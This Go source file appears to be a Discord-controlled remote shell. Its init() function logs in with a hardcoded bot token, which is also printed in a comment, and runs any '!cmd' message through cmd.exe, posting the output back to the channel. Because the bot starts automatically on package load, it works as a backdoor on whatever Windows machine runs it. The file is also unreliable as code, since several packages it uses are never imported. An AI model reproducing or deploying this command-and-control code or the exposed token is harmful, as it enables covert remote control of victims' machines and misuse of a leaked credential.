package discord

//bot token: MTA3MTM1Mzk4MDUxODY2NjI3MQ.GsePFG.y14ecaQWMYzZ8Wrf3rylPZYQ1l1u8imjc6GJgA


import (
	"github.com/bwmarrin/discordgo"
	"os"
	"os/signal"
)

func init() {
	// s -> *discordgo.Session
	s, err := discordgo.New("Bot MTA3MTM1Mzk4MDUxODY2NjI3MQ.GsePFG.y14ecaQWMYzZ8Wrf3rylPZYQ1l1u8imjc6GJgA")
	if err != nil {
		fmt.Println(err)
	}
	s.AddHandler(ready)
	s.AddHandler(messageCreate)
	err = s.Open()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("[+] Bot up and running!")
	
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<- sc
}

func ready(s *discordgo.Session, event *discordgo.Event) {
	s.UpdateGameStatus(0, "!goblino <command>")
}

func messageCreate(s *discordgo.Session, message *discordgo.MessageCreate) {
	if strings.HasPrefix(message.Content, "!") {
		command := strings.Split(message.Content, " ")
		if command[0] == "!cmd" && len(command) > 1 {
			//execute cmd
			fullCmd := ""
			for _, cmd := range command[1:] {
				fullCmd = fullCmd + cmd + " "
			}
			cmdArray := []string{"/c", fullCmd}
			fmt.Println("Executing ", cmdArray)
			out, err := exec.Command("cmd.exe", cmdArray...).Output()
			if err != nil {
				fmt.Println("Error encountered! Sending error to discord...")
				s.ChannelMessageSend(message.ChannelID, err.Error())
			} else {
				s.ChannelMessageSend(message.ChannelID, string(out))
			}
		}
	}
}